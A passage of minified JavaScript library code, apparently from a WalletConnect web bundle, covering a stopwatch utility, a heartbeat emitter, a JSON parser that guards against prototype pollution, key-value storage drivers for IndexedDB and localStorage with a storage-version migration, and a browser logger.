    return B8 || (B8 = 1,
    function(r) {
        Object.defineProperty(r, "__esModule", {
            value: !0
        });
        const e = p0;
        e.__exportStar(RG(), r),
        e.__exportStar(NG(), r)
    }(Hv)),
    Hv
}
var gf = {}, _8;
function FG() {
    if (_8)
        return gf;
    _8 = 1,
    Object.defineProperty(gf, "__esModule", {
        value: !0
    }),
    gf.Watch = void 0;
    class r {
        constructor() {
            this.timestamps = new Map
        }
        start(t) {
            if (this.timestamps.has(t))
                throw new Error(`Watch already started for label: ${t}`);
            this.timestamps.set(t, {
                started: Date.now()
            })
        }
        stop(t) {
            const o = this.get(t);
            if (typeof o.elapsed < "u")
                throw new Error(`Watch already stopped for label: ${t}`);
            const i = Date.now() - o.started;
            this.timestamps.set(t, {
                started: o.started,
                elapsed: i
            })
        }
        get(t) {
            const o = this.timestamps.get(t);
            if (typeof o > "u")
                throw new Error(`No timestamp found for label: ${t}`);
            return o
        }
        elapsed(t) {
            const o = this.get(t);
            return o.elapsed || Date.now() - o.started
        }
    }
    return gf.Watch = r,
    gf.default = r,
    gf
}
var Zv = {}, lp = {}, I8;
function UG() {
    if (I8)
        return lp;
    I8 = 1,
    Object.defineProperty(lp, "__esModule", {
        value: !0
    }),
    lp.IWatch = void 0;
    class r {
    }
    return lp.IWatch = r,
    lp
}
var O8;
function kG() {
    return O8 || (O8 = 1,
    function(r) {
        Object.defineProperty(r, "__esModule", {
            value: !0
        }),
        p0.__exportStar(UG(), r)
    }(Zv)),
    Zv
}
var R8;
function LG() {
    return R8 || (R8 = 1,
    function(r) {
        Object.defineProperty(r, "__esModule", {
            value: !0
        });
        const e = p0;
        e.__exportStar(DG(), r),
        e.__exportStar(FG(), r),
        e.__exportStar(kG(), r),
        e.__exportStar(xM(), r)
    }(Vv)),
    Vv
}
var Ze = LG();
class Cu {
}
let $G = class extends Cu {
    constructor(e) {
        super()
    }
}
;
const W8 = Ze.FIVE_SECONDS
  , Su = {
    pulse: "heartbeat_pulse"
};
let zG = class wM extends $G {
    constructor(e) {
        super(e),
        this.events = new fs.EventEmitter,
        this.interval = W8,
        this.interval = (e == null ? void 0 : e.interval) || W8
    }
    static async init(e) {
        const t = new wM(e);
        return await t.init(),
        t
    }
    async init() {
        await this.initialize()
    }
    stop() {
        clearInterval(this.intervalRef)
    }
    on(e, t) {
        this.events.on(e, t)
    }
    once(e, t) {
        this.events.once(e, t)
    }
    off(e, t) {
        this.events.off(e, t)
    }
    removeListener(e, t) {
        this.events.removeListener(e, t)
    }
    async initialize() {
        this.intervalRef = setInterval( () => this.pulse(), Ze.toMiliseconds(this.interval))
    }
    pulse() {
        this.events.emit(Su.pulse)
    }
}
;
const jG = /"(?:_|\\u0{2}5[Ff]){2}(?:p|\\u0{2}70)(?:r|\\u0{2}72)(?:o|\\u0{2}6[Ff])(?:t|\\u0{2}74)(?:o|\\u0{2}6[Ff])(?:_|\\u0{2}5[Ff]){2}"\s*:/
  , qG = /"(?:c|\\u0063)(?:o|\\u006[Ff])(?:n|\\u006[Ee])(?:s|\\u0073)(?:t|\\u0074)(?:r|\\u0072)(?:u|\\u0075)(?:c|\\u0063)(?:t|\\u0074)(?:o|\\u006[Ff])(?:r|\\u0072)"\s*:/
  , VG = /^\s*["[{]|^\s*-?\d{1,16}(\.\d{1,17})?([Ee][+-]?\d+)?\s*$/;
function HG(r, e) {
    if (r === "__proto__" || r === "constructor" && e && typeof e == "object" && "prototype"in e) {
        GG(r);
        return
    }
    return e
}
function GG(r) {
    console.warn(`[destr] Dropping "${r}" key to prevent prototype pollution.`)
}
function oy(r, e={}) {
    if (typeof r != "string")
        return r;
    if (r[0] === '"' && r[r.length - 1] === '"' && r.indexOf("\\") === -1)
        return r.slice(1, -1);
    const t = r.trim();
    if (t.length <= 9)
        switch (t.toLowerCase()) {
        case "true":
            return !0;
        case "false":
            return !1;
        case "undefined":
            return;
        case "null":
            return null;
        case "nan":
            return Number.NaN;
        case "infinity":
            return Number.POSITIVE_INFINITY;
        case "-infinity":
            return Number.NEGATIVE_INFINITY
        }
    if (!VG.test(r)) {
        if (e.strict)
            throw new SyntaxError("[destr] Invalid JSON");
        return r
    }
    try {
        if (jG.test(r) || qG.test(r)) {
            if (e.strict)
                throw new Error("[destr] Possible prototype pollution");
            return JSON.parse(r, HG)
        }
        return JSON.parse(r)
    } catch (o) {
        if (e.strict)
            throw o;
        return r
    }
}
function KG(r) {
    return !r || typeof r.then != "function" ? Promise.resolve(r) : r
}
function Pn(r, ...e) {
    try {
        return KG(r(...e))
    } catch (t) {
        return Promise.reject(t)
    }
}
function ZG(r) {
    const e = typeof r;
    return r === null || e !== "object" && e !== "function"
}
function YG(r) {
    const e = Object.getPrototypeOf(r);
    return !e || e.isPrototypeOf(Object)
}
function mm(r) {
    if (ZG(r))
        return String(r);
    if (YG(r) || Array.isArray(r))
        return JSON.stringify(r);
    if (typeof r.toJSON == "function")
        return mm(r.toJSON());
    throw new Error("[unstorage] Cannot stringify value!")
}
const _E = "base64:";
function XG(r) {
    return typeof r == "string" ? r : _E + eK(r)
}
function JG(r) {
    return typeof r != "string" || !r.startsWith(_E) ? r : QG(r.slice(_E.length))
}
function QG(r) {
    return globalThis.Buffer ? Buffer.from(r, "base64") : Uint8Array.from(globalThis.atob(r), e => e.codePointAt(0))
}
function eK(r) {
    return globalThis.Buffer ? Buffer.from(r).toString("base64") : globalThis.btoa(String.fromCodePoint(...r))
}
function Bo(r) {
    var e;
    return r && ((e = r.split("?")[0]) == null ? void 0 : e.replace(/[/\\]/g, ":").replace(/:+/g, ":").replace(/^:|:$/g, "")) || ""
}
function tK(...r) {
    return Bo(r.join(":"))
}
function iy(r) {
    return r = Bo(r),
    r ? r + ":" : ""
}
function rK(r, e) {
    if (e === void 0)
        return !0;
    let t = 0
      , o = r.indexOf(":");
    for (; o > -1; )
        t++,
        o = r.indexOf(":", o + 1);
    return t <= e
}
function nK(r, e) {
    return e ? r.startsWith(e) && r[r.length - 1] !== "$" : r[r.length - 1] !== "$"
}
const oK = "memory"
  , iK = () => {
    const r = new Map;
    return {
        name: oK,
        getInstance: () => r,
        hasItem(e) {
            return r.has(e)
        },
        getItem(e) {
            return r.get(e) ?? null
        },
        getItemRaw(e) {
            return r.get(e) ?? null
        },
        setItem(e, t) {
            r.set(e, t)
        },
        setItemRaw(e, t) {
            r.set(e, t)
        },
        removeItem(e) {
            r.delete(e)
        },
        getKeys() {
            return [...r.keys()]
        },
        clear() {
            r.clear()
        },
        dispose() {
            r.clear()
        }
    }
}
;
function sK(r={}) {
    const e = {
        mounts: {
            "": r.driver || iK()
        },
        mountpoints: [""],
        watching: !1,
        watchListeners: [],
        unwatch: {}
    }
      , t = f => {
        for (const h of e.mountpoints)
            if (f.startsWith(h))
                return {
                    base: h,
                    relativeKey: f.slice(h.length),
                    driver: e.mounts[h]
                };
        return {
            base: "",
            relativeKey: f,
            driver: e.mounts[""]
        }
    }
      , o = (f, h) => e.mountpoints.filter(p => p.startsWith(f) || h && f.startsWith(p)).map(p => ({
        relativeBase: f.length > p.length ? f.slice(p.length) : void 0,
        mountpoint: p,
        driver: e.mounts[p]
    }))
      , i = (f, h) => {
        if (e.watching) {
            h = Bo(h);
            for (const p of e.watchListeners)
                p(f, h)
        }
    }
      , n = async () => {
        if (!e.watching) {
            e.watching = !0;
            for (const f in e.mounts)
                e.unwatch[f] = await M8(e.mounts[f], i, f)
        }
    }
      , s = async () => {
        if (e.watching) {
            for (const f in e.unwatch)
                await e.unwatch[f]();
            e.unwatch = {},
            e.watching = !1
        }
    }
      , a = (f, h, p) => {
        const b = new Map
          , v = T => {
            let x = b.get(T.base);
            return x || (x = {
                driver: T.driver,
                base: T.base,
                items: []
            },
            b.set(T.base, x)),
            x
        }
        ;
        for (const T of f) {
            const x = typeof T == "string"
              , E = Bo(x ? T : T.key)
              , B = x ? void 0 : T.value
              , P = x || !T.options ? h : {
                ...h,
                ...T.options
            }
              , O = t(E);
            v(O).items.push({
                key: E,
                value: B,
                relativeKey: O.relativeKey,
                options: P
            })
        }
        return Promise.all([...b.values()].map(T => p(T))).then(T => T.flat())
    }
      , l = {
        hasItem(f, h={}) {
            f = Bo(f);
            const {relativeKey: p, driver: b} = t(f);
            return Pn(b.hasItem, p, h)
        },
        getItem(f, h={}) {
            f = Bo(f);
            const {relativeKey: p, driver: b} = t(f);
            return Pn(b.getItem, p, h).then(v => oy(v))
        },
        getItems(f, h={}) {
            return a(f, h, p => p.driver.getItems ? Pn(p.driver.getItems, p.items.map(b => ({
                key: b.relativeKey,
                options: b.options
            })), h).then(b => b.map(v => ({
                key: tK(p.base, v.key),
                value: oy(v.value)
            }))) : Promise.all(p.items.map(b => Pn(p.driver.getItem, b.relativeKey, b.options).then(v => ({
                key: b.key,
                value: oy(v)
            })))))
        },
        getItemRaw(f, h={}) {
            f = Bo(f);
            const {relativeKey: p, driver: b} = t(f);
            return b.getItemRaw ? Pn(b.getItemRaw, p, h) : Pn(b.getItem, p, h).then(v => JG(v))
        },
        async setItem(f, h, p={}) {
            if (h === void 0)
                return l.removeItem(f);
            f = Bo(f);
            const {relativeKey: b, driver: v} = t(f);
            v.setItem && (await Pn(v.setItem, b, mm(h), p),
            v.watch || i("update", f))
        },
        async setItems(f, h) {
            await a(f, h, async p => {
                if (p.driver.setItems)
                    return Pn(p.driver.setItems, p.items.map(b => ({
                        key: b.relativeKey,
                        value: mm(b.value),
                        options: b.options
                    })), h);
                p.driver.setItem && await Promise.all(p.items.map(b => Pn(p.driver.setItem, b.relativeKey, mm(b.value), b.options)))
            }
            )
        },
        async setItemRaw(f, h, p={}) {
            if (h === void 0)
                return l.removeItem(f, p);
            f = Bo(f);
            const {relativeKey: b, driver: v} = t(f);
            if (v.setItemRaw)
                await Pn(v.setItemRaw, b, h, p);
            else if (v.setItem)
                await Pn(v.setItem, b, XG(h), p);
            else
                return;
            v.watch || i("update", f)
        },
        async removeItem(f, h={}) {
            typeof h == "boolean" && (h = {
                removeMeta: h
            }),
            f = Bo(f);
            const {relativeKey: p, driver: b} = t(f);
            b.removeItem && (await Pn(b.removeItem, p, h),
            (h.removeMeta || h.removeMata) && await Pn(b.removeItem, p + "$", h),
            b.watch || i("remove", f))
        },
        async getMeta(f, h={}) {
            typeof h == "boolean" && (h = {
                nativeOnly: h
            }),
            f = Bo(f);
            const {relativeKey: p, driver: b} = t(f)
              , v = Object.create(null);
            if (b.getMeta && Object.assign(v, await Pn(b.getMeta, p, h)),
            !h.nativeOnly) {
                const T = await Pn(b.getItem, p + "$", h).then(x => oy(x));
                T && typeof T == "object" && (typeof T.atime == "string" && (T.atime = new Date(T.atime)),
                typeof T.mtime == "string" && (T.mtime = new Date(T.mtime)),
                Object.assign(v, T))
            }
            return v
        },
        setMeta(f, h, p={}) {
            return this.setItem(f + "$", h, p)
        },
        removeMeta(f, h={}) {
            return this.removeItem(f + "$", h)
        },
        async getKeys(f, h={}) {
            var E;
            f = iy(f);
            const p = o(f, !0);
            let b = [];
            const v = [];
            let T = !0;
            for (const B of p) {
                (E = B.driver.flags) != null && E.maxDepth || (T = !1);
                const P = await Pn(B.driver.getKeys, B.relativeBase, h);
                for (const O of P) {
                    const F = B.mountpoint + Bo(O);
                    b.some(D => F.startsWith(D)) || v.push(F)
                }
                b = [B.mountpoint, ...b.filter(O => !O.startsWith(B.mountpoint))]
            }
            const x = h.maxDepth !== void 0 && !T;
            return v.filter(B => (!x || rK(B, h.maxDepth)) && nK(B, f))
        },
        async clear(f, h={}) {
            f = iy(f),
            await Promise.all(o(f, !1).map(async p => {
                if (p.driver.clear)
                    return Pn(p.driver.clear, p.relativeBase, h);
                if (p.driver.removeItem) {
                    const b = await p.driver.getKeys(p.relativeBase || "", h);
                    return Promise.all(b.map(v => p.driver.removeItem(v, h)))
                }
            }
            ))
        },
        async dispose() {
            await Promise.all(Object.values(e.mounts).map(f => N8(f)))
        },
        async watch(f) {
            return await n(),
            e.watchListeners.push(f),
            async () => {
                e.watchListeners = e.watchListeners.filter(h => h !== f),
                e.watchListeners.length === 0 && await s()
            }
        },
        async unwatch() {
            e.watchListeners = [],
            await s()
        },
        mount(f, h) {
            if (f = iy(f),
            f && e.mounts[f])
                throw new Error(`already mounted at ${f}`);
            return f && (e.mountpoints.push(f),
            e.mountpoints.sort( (p, b) => b.length - p.length)),
            e.mounts[f] = h,
            e.watching && Promise.resolve(M8(h, i, f)).then(p => {
                e.unwatch[f] = p
            }
            ).catch(console.error),
            l
        },
        async unmount(f, h=!0) {
            var p, b;
            f = iy(f),
            !(!f || !e.mounts[f]) && (e.watching && f in e.unwatch && ((b = (p = e.unwatch)[f]) == null || b.call(p),
            delete e.unwatch[f]),
            h && await N8(e.mounts[f]),
            e.mountpoints = e.mountpoints.filter(v => v !== f),
            delete e.mounts[f])
        },
        getMount(f="") {
            f = Bo(f) + ":";
            const h = t(f);
            return {
                driver: h.driver,
                base: h.base
            }
        },
        getMounts(f="", h={}) {
            return f = Bo(f),
            o(f, h.parents).map(b => ({
                driver: b.driver,
                base: b.mountpoint
            }))
        },
        keys: (f, h={}) => l.getKeys(f, h),
        get: (f, h={}) => l.getItem(f, h),
        set: (f, h, p={}) => l.setItem(f, h, p),
        has: (f, h={}) => l.hasItem(f, h),
        del: (f, h={}) => l.removeItem(f, h),
        remove: (f, h={}) => l.removeItem(f, h)
    };
    return l
}
function M8(r, e, t) {
    return r.watch ? r.watch( (o, i) => e(o, t + i)) : () => {}
}
async function N8(r) {
    typeof r.dispose == "function" && await Pn(r.dispose)
}
function Bu(r) {
    return new Promise( (e, t) => {
        r.oncomplete = r.onsuccess = () => e(r.result),
        r.onabort = r.onerror = () => t(r.error)
    }
    )
}
function vM(r, e) {
    let t;
    const o = () => {
        if (t)
            return t;
        const i = indexedDB.open(r);
        return i.onupgradeneeded = () => i.result.createObjectStore(e),
        t = Bu(i),
        t.then(n => {
            n.onclose = () => t = void 0
        }
        , () => {}
        ),
        t
    }
    ;
    return (i, n) => o().then(s => n(s.transaction(e, i).objectStore(e)))
}
let Yv;
function g0() {
    return Yv || (Yv = vM("keyval-store", "keyval")),
    Yv
}
function D8(r, e=g0()) {
    return e("readonly", t => Bu(t.get(r)))
}
function aK(r, e, t=g0()) {
    return t("readwrite", o => (o.put(e, r),
    Bu(o.transaction)))
}
function cK(r, e=g0()) {
    return e("readwrite", t => (t.delete(r),
    Bu(t.transaction)))
}
function lK(r=g0()) {
    return r("readwrite", e => (e.clear(),
    Bu(e.transaction)))
}
function uK(r, e) {
    return r.openCursor().onsuccess = function() {
        this.result && (e(this.result),
        this.result.continue())
    }
    ,
    Bu(r.transaction)
}
function fK(r=g0()) {
    return r("readonly", e => {
        if (e.getAllKeys)
            return Bu(e.getAllKeys());
        const t = [];
        return uK(e, o => t.push(o.key)).then( () => t)
    }
    )
}
const dK = r => JSON.stringify(r, (e, t) => typeof t == "bigint" ? t.toString() + "n" : t)
  , hK = r => {
    const e = /([\[:])?(\d{17,}|(?:[9](?:[1-9]07199254740991|0[1-9]7199254740991|00[8-9]199254740991|007[2-9]99254740991|007199[3-9]54740991|0071992[6-9]4740991|00719925[5-9]740991|007199254[8-9]40991|0071992547[5-9]0991|00719925474[1-9]991|00719925474099[2-9])))([,\}\]])/g
      , t = r.replace(e, '$1"$2n"$3');
    return JSON.parse(t, (o, i) => typeof i == "string" && i.match(/^\d+n$/) ? BigInt(i.substring(0, i.length - 1)) : i)
}
;
function Ed(r) {
    if (typeof r != "string")
        throw new Error(`Cannot safe json parse value of type ${typeof r}`);
    try {
        return hK(r)
    } catch {
        return r
    }
}
function uu(r) {
    return typeof r == "string" ? r : dK(r) || ""
}
const pK = "idb-keyval";
var gK = (r={}) => {
    const e = r.base && r.base.length > 0 ? `${r.base}:` : ""
      , t = i => e + i;
    let o;
    return r.dbName && r.storeName && (o = vM(r.dbName, r.storeName)),
    {
        name: pK,
        options: r,
        async hasItem(i) {
            return !(typeof await D8(t(i), o) > "u")
        },
        async getItem(i) {
            return await D8(t(i), o) ?? null
        },
        setItem(i, n) {
            return aK(t(i), n, o)
        },
        removeItem(i) {
            return cK(t(i), o)
        },
        getKeys() {
            return fK(o)
        },
        clear() {
            return lK(o)
        }
    }
}
;
const yK = "WALLET_CONNECT_V2_INDEXED_DB"
  , bK = "keyvaluestorage";
let mK = class {
    constructor() {
        this.indexedDb = sK({
            driver: gK({
                dbName: yK,
                storeName: bK
            })
        })
    }
    async getKeys() {
        return this.indexedDb.getKeys()
    }
    async getEntries() {
        return (await this.indexedDb.getItems(await this.indexedDb.getKeys())).map(e => [e.key, e.value])
    }
    async getItem(e) {
        const t = await this.indexedDb.getItem(e);
        if (t !== null)
            return t
    }
    async setItem(e, t) {
        await this.indexedDb.setItem(e, uu(t))
    }
    async removeItem(e) {
        await this.indexedDb.removeItem(e)
    }
}
;
var Xv = typeof globalThis < "u" ? globalThis : typeof window < "u" ? window : typeof global < "u" ? global : typeof self < "u" ? self : {}
  , xm = {
    exports: {}
};
(function() {
    let r;
    function e() {}
    r = e,
    r.prototype.getItem = function(t) {
        return this.hasOwnProperty(t) ? String(this[t]) : null
    }
    ,
    r.prototype.setItem = function(t, o) {
        this[t] = String(o)
    }
    ,
    r.prototype.removeItem = function(t) {
        delete this[t]
    }
    ,
    r.prototype.clear = function() {
        const t = this;
        Object.keys(t).forEach(function(o) {
            t[o] = void 0,
            delete t[o]
        })
    }
    ,
    r.prototype.key = function(t) {
        return t = t || 0,
        Object.keys(this)[t]
    }
    ,
    r.prototype.__defineGetter__("length", function() {
        return Object.keys(this).length
    }),
    typeof Xv < "u" && Xv.localStorage ? xm.exports = Xv.localStorage : typeof window < "u" && window.localStorage ? xm.exports = window.localStorage : xm.exports = new e
}
)();
function xK(r) {
    var e;
    return [r[0], Ed((e = r[1]) != null ? e : "")]
}
let wK = class {
    constructor() {
        this.localStorage = xm.exports
    }
    async getKeys() {
        return Object.keys(this.localStorage)
    }
    async getEntries() {
        return Object.entries(this.localStorage).map(xK)
    }
    async getItem(e) {
        const t = this.localStorage.getItem(e);
        if (t !== null)
            return Ed(t)
    }
    async setItem(e, t) {
        this.localStorage.setItem(e, uu(t))
    }
    async removeItem(e) {
        this.localStorage.removeItem(e)
    }
}
;
const vK = "wc_storage_version"
  , F8 = 1
  , TK = async (r, e, t) => {
    const o = vK
      , i = await e.getItem(o);
    if (i && i >= F8) {
        t(e);
        return
    }
    const n = await r.getKeys();
    if (!n.length) {
        t(e);
        return
    }
    const s = [];
    for (; n.length; ) {
        const a = n.shift();
        if (!a)
            continue;
        const l = a.toLowerCase();
        if (l.includes("wc@") || l.includes("walletconnect") || l.includes("wc_") || l.includes("wallet_connect")) {
            const f = await r.getItem(a);
            await e.setItem(a, f),
            s.push(a)
        }
    }
    await e.setItem(o, F8),
    t(e),
    EK(r, s)
}
  , EK = async (r, e) => {
    e.length && e.forEach(async t => {
        await r.removeItem(t)
    }
    )
}
;
let AK = class {
    constructor() {
        this.initialized = !1,
        this.setInitialized = t => {
            this.storage = t,
            this.initialized = !0
        }
        ;
        const e = new wK;
        this.storage = e;
        try {
            const t = new mK;
            TK(e, t, this.setInitialized)
        } catch {
            this.initialized = !0
        }
    }
    async getKeys() {
        return await this.initialize(),
        this.storage.getKeys()
    }
    async getEntries() {
        return await this.initialize(),
        this.storage.getEntries()
    }
    async getItem(e) {
        return await this.initialize(),
        this.storage.getItem(e)
    }
    async setItem(e, t) {
        return await this.initialize(),
        this.storage.setItem(e, t)
    }
    async removeItem(e) {
        return await this.initialize(),
        this.storage.removeItem(e)
    }
    async initialize() {
        this.initialized || await new Promise(e => {
            const t = setInterval( () => {
                this.initialized && (clearInterval(t),
                e())
            }
            , 20)
        }
        )
    }
}
;
var Jv, U8;
function PK() {
    if (U8)
        return Jv;
    U8 = 1;
    function r(t) {
        try {
            return JSON.stringify(t)
        } catch {
            return '"[Circular]"'
        }
    }
    Jv = e;
    function e(t, o, i) {
        var n = i && i.stringify || r
          , s = 1;
        if (typeof t == "object" && t !== null) {
            var a = o.length + s;
            if (a === 1)
                return t;
            var l = new Array(a);
            l[0] = n(t);
            for (var f = 1; f < a; f++)
                l[f] = n(o[f]);
            return l.join(" ")
        }
        if (typeof t != "string")
            return t;
        var h = o.length;
        if (h === 0)
            return t;
        for (var p = "", b = 1 - s, v = -1, T = t && t.length || 0, x = 0; x < T; ) {
            if (t.charCodeAt(x) === 37 && x + 1 < T) {
                switch (v = v > -1 ? v : 0,
                t.charCodeAt(x + 1)) {
                case 100:
                case 102:
                    if (b >= h || o[b] == null)
                        break;
                    v < x && (p += t.slice(v, x)),
                    p += Number(o[b]),
                    v = x + 2,
                    x++;
                    break;
                case 105:
                    if (b >= h || o[b] == null)
                        break;
                    v < x && (p += t.slice(v, x)),
                    p += Math.floor(Number(o[b])),
                    v = x + 2,
                    x++;
                    break;
                case 79:
                case 111:
                case 106:
                    if (b >= h || o[b] === void 0)
                        break;
                    v < x && (p += t.slice(v, x));
                    var E = typeof o[b];
                    if (E === "string") {
                        p += "'" + o[b] + "'",
                        v = x + 2,
                        x++;
                        break
                    }
                    if (E === "function") {
                        p += o[b].name || "<anonymous>",
                        v = x + 2,
                        x++;
                        break
                    }
                    p += n(o[b]),
                    v = x + 2,
                    x++;
                    break;
                case 115:
                    if (b >= h)
                        break;
                    v < x && (p += t.slice(v, x)),
                    p += String(o[b]),
                    v = x + 2,
                    x++;
                    break;
                case 37:
                    v < x && (p += t.slice(v, x)),
                    p += "%",
                    v = x + 2,
                    x++,
                    b--;
                    break
                }
                ++b
            }
            ++x
        }
        return v === -1 ? t : (v < T && (p += t.slice(v)),
        p)
    }
    return Jv
}
var Qv, k8;
function CK() {
    if (k8)
        return Qv;
    k8 = 1;
    const r = PK();
    Qv = i;
    const e = D().console || {}
      , t = {
        mapHttpRequest: T,
        mapHttpResponse: T,
        wrapRequestSerializer: x,
        wrapResponseSerializer: x,
        wrapErrorSerializer: x,
        req: T,
        res: T,
        err: b
    };
    function o(I, M) {
        return Array.isArray(I) ? I.filter(function(W) {
            return W !== "!stdSerializers.err"
        }) : I === !0 ? Object.keys(M) : !1
    }
    function i(I) {
        I = I || {},
        I.browser = I.browser || {};
        const M = I.browser.transmit;
        if (M && typeof M.send != "function")
            throw Error("pino: transmit option must have a send function");
        const C = I.browser.write || e;
        I.browser.write && (I.browser.asObject = !0);
        const W = I.serializers || {}
          , k = o(I.browser.serialize, W);
        let H = I.browser.serialize;
        Array.isArray(I.browser.serialize) && I.browser.serialize.indexOf("!stdSerializers.err") > -1 && (H = !1);
        const X = ["error", "fatal", "warn", "info", "debug", "trace"];
        typeof C == "function" && (C.error = C.fatal = C.warn = C.info = C.debug = C.trace = C),
        I.enabled === !1 && (I.level = "silent");
        const Y = I.level || "info"
          , V = Object.create(C);
        V.log || (V.log = E),
        Object.defineProperty(V, "levelVal", {
            get: _
        }),
        Object.defineProperty(V, "level", {
            get: $,
            set: z
        });
        const R = {
            transmit: M,
            serialize: k,
            asObject: I.browser.asObject,
            levels: X,
            timestamp: v(I)
        };
        V.levels = i.levels,
        V.level = Y,
        V.setMaxListeners = V.getMaxListeners = V.emit = V.addListener = V.on = V.prependListener = V.once = V.prependOnceListener = V.removeListener = V.removeAllListeners = V.listeners = V.listenerCount = V.eventNames = V.write = V.flush = E,
        V.serializers = W,
        V._serialize = k,
        V._stdErrSerialize = H,
        V.child = K,
        M && (V._logEvent = p());
        function _() {
            return this.level === "silent" ? 1 / 0 : this.levels.values[this.level]
        }
        function $() {
            return this._level
        }
        function z(j) {
            if (j !== "silent" && !this.levels.values[j])
                throw Error("unknown level " + j);
            this._level = j,
            n(R, V, "error", "log"),
            n(R, V, "fatal", "error"),
            n(R, V, "warn", "error"),
            n(R, V, "info", "log"),
            n(R, V, "debug", "log"),
            n(R, V, "trace", "log")
        }
        function K(j, ee) {
            if (!j)
                throw new Error("missing bindings for child Pino");
            ee = ee || {},
            k && j.serializers && (ee.serializers = j.serializers);
            const ie = ee.serializers;
            if (k && ie) {
                var ae = Object.assign({}, W, ie)
                  , he = I.browser.serialize === !0 ? Object.keys(ae) : k;
                delete j.serializers,
                l([j], he, ae, this._stdErrSerialize)
            }
            function me(Pe) {
                this._childLevel = (Pe._childLevel | 0) + 1,
                this.error = f(Pe, j, "error"),
                this.fatal = f(Pe, j, "fatal"),
                this.warn = f(Pe, j, "warn"),
                this.info = f(Pe, j, "info"),
                this.debug = f(Pe, j, "debug"),
                this.trace = f(Pe, j, "trace"),
                ae && (this.serializers = ae,
                this._serialize = he),
                M && (this._logEvent = p([].concat(Pe._logEvent.bindings, j)))
            }
            return me.prototype = this,
            new me(this)
        }
        return V
    }
    i.levels = {
        values: {
            fatal: 60,
            error: 50,
            warn: 40,
            info: 30,
            debug: 20,
            trace: 10
        },
        labels: {
            10: "trace",
            20: "debug",
            30: "info",
            40: "warn",
            50: "error",
            60: "fatal"
        }
    },
    i.stdSerializers = t,
    i.stdTimeFunctions = Object.assign({}, {
        nullTime: B,
        epochTime: P,
        unixTime: O,
        isoTime: F
    });
    function n(I, M, C, W) {
        const k = Object.getPrototypeOf(M);
        M[C] = M.levelVal > M.levels.values[C] ? E : k[C] ? k[C] : e[C] || e[W] || E,
        s(I, M, C)
    }
    function s(I, M, C) {
        !I.transmit && M[C] === E || (M[C] = function(W) {
            return function() {
                const H = I.timestamp()
                  , X = new Array(arguments.length)
                  , Y = Object.getPrototypeOf && Object.getPrototypeOf(this) === e ? e : this;
                for (var V = 0; V < X.length; V++)
                    X[V] = arguments[V];
                if (I.serialize && !I.asObject && l(X, this._serialize, this.serializers, this._stdErrSerialize),
                I.asObject ? W.call(Y, a(this, C, X, H)) : W.apply(Y, X),
                I.transmit) {
                    const R = I.transmit.level || M.level
                      , _ = i.levels.values[R]
                      , $ = i.levels.values[C];
                    if ($ < _)
                        return;
                    h(this, {
                        ts: H,
                        methodLevel: C,
                        methodValue: $,
                        transmitValue: i.levels.values[I.transmit.level || M.level],
                        send: I.transmit.send,
                        val: M.levelVal
                    }, X)
                }
            }
        }(M[C]))
    }
    function a(I, M, C, W) {
        I._serialize && l(C, I._serialize, I.serializers, I._stdErrSerialize);
        const k = C.slice();
        let H = k[0];
        const X = {};
        W && (X.time = W),
        X.level = i.levels.values[M];
        let Y = (I._childLevel | 0) + 1;
        if (Y < 1 && (Y = 1),
        H !== null && typeof H == "object") {
            for (; Y-- && typeof k[0] == "object"; )
                Object.assign(X, k.shift());
            H = k.length ? r(k.shift(), k) : void 0
        } else
            typeof H == "string" && (H = r(k.shift(), k));
        return H !== void 0 && (X.msg = H),
        X
    }
    function l(I, M, C, W) {
        for (const k in I)
            if (W && I[k]instanceof Error)
                I[k] = i.stdSerializers.err(I[k]);
            else if (typeof I[k] == "object" && !Array.isArray(I[k]))
                for (const H in I[k])
                    M && M.indexOf(H) > -1 && H in C && (I[k][H] = C[H](I[k][H]))
    }
    function f(I, M, C) {
        return function() {
            const W = new Array(1 + arguments.length);
            W[0] = M;
            for (var k = 1; k < W.length; k++)
                W[k] = arguments[k - 1];
            return I[C].apply(this, W)
        }
    }
    function h(I, M, C) {
        const W = M.send
          , k = M.ts
          , H = M.methodLevel
          , X = M.methodValue
          , Y = M.val
          , V = I._logEvent.bindings;
        l(C, I._serialize || Object.keys(I.serializers), I.serializers, I._stdErrSerialize === void 0 ? !0 : I._stdErrSerialize),
        I._logEvent.ts = k,
        I._logEvent.messages = C.filter(function(R) {
            return V.indexOf(R) === -1
        }),
        I._logEvent.level.label = H,
        I._logEvent.level.value = X,
        W(H, I._logEvent, Y),
        I._logEvent = p(V)
    }
    function p(I) {
        return {
            ts: 0,
            messages: [],
            bindings: I || [],
            level: {
                label: "",
                value: 0
            }
        }
    }
    function b(I) {
        const M = {
            type: I.constructor.name,
            msg: I.message,
            stack: I.stack
        };
        for (const C in I)
            M[C] === void 0 && (M[C] = I[C]);
        return M
    }
    function v(I) {
        return typeof I.timestamp == "function" ? I.timestamp : I.timestamp === !1 ? B : P
    }
    function T() {
        return {}
    }
    function x(I) {
        return I
    }
    function E() {}
    function B() {
        return !1
    }
    function P() {
        return Date.now()
    }
    function O() {
        return Math.round(Date.now() / 1e3)
    }
    function F() {
        return new Date(Date.now()).toISOString()
    }
    function D() {
        function I(M) {
            return typeof M < "u" && M
        }
        try {
            return typeof globalThis < "u" || Object.defineProperty(Object.prototype, "globalThis", {
                get: function() {
                    return delete Object.prototype.globalThis,
                    this.globalThis = this
                },
                configurable: !0
            }),
            globalThis
        } catch {
            return I(self) || I(window) || I(this) || {}
        }
    }
    return Qv
}
var Lf = CK();
const S1 = Zc(Lf)
  , SK = {
    level: "info"
}
  , y0 = "custom_context"
  , b3 = 1e3 * 1024;
let BK = class {
    constructor(e) {
        this.nodeValue = e,
        this.sizeInBytes = new TextEncoder().encode(this.nodeValue).length,
        this.next = null
    }
    get value() {
        return this.nodeValue
    }
    get size() {
        return this.sizeInBytes
    }
}
  , L8 = class {
    constructor(e) {
        this.head = null,
        this.tail = null,
        this.lengthInNodes = 0,
        this.maxSizeInBytes = e,
        this.sizeInBytes = 0
    }
    append(e) {
        const t = new BK(e);
        if (t.size > this.maxSizeInBytes)
            throw new Error(`[LinkedList] Value too big to insert into list: ${e} with size ${t.size}`);
        for (; this.size + t.size > this.maxSizeInBytes; )
            this.shift();
        this.head ? (this.tail && (this.tail.next = t),
        this.tail = t) : (this.head = t,
        this.tail = t),
        this.lengthInNodes++,
        this.sizeInBytes += t.size
    }
    shift() {
        if (!this.head)
            return;
        const e = this.head;
        this.head = this.head.next,
        this.head || (this.tail = null),
        this.lengthInNodes--,
        this.sizeInBytes -= e.size
    }
    toArray() {
        const e = [];
        let t = this.head;
        for (; t !== null; )
